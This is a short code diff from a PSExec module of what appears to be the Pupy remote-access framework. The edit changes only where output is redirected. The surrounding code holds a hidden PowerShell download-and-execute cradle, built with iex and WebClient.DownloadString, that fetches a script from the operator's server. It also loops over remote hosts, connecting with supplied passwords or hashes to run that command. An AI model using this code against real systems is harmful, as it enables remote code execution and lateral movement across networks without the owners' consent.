@@ -129,7 +129,7 @@ class PSExec(PupyModule):
             self.success('server started (pid: %s)' % process.pid)
             args.command = 'powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString(\'http://%s:%s/eiloShaegae1\')"' % (ip, str(args.ps1_port))
 
-        with redirected_stdo(self.client.conn):
+        with redirected_stdo(self):
             for host in hosts:
                 self.info("Connecting to the remote host: %s" % host)
                 self.client.conn.modules["pupyutils.psexec"].connect(host, args.port, args.user, args.passwd, args.hash, args.share, file_to_upload, remote_path, dst_folder, args.command, args.domain, args.execm)
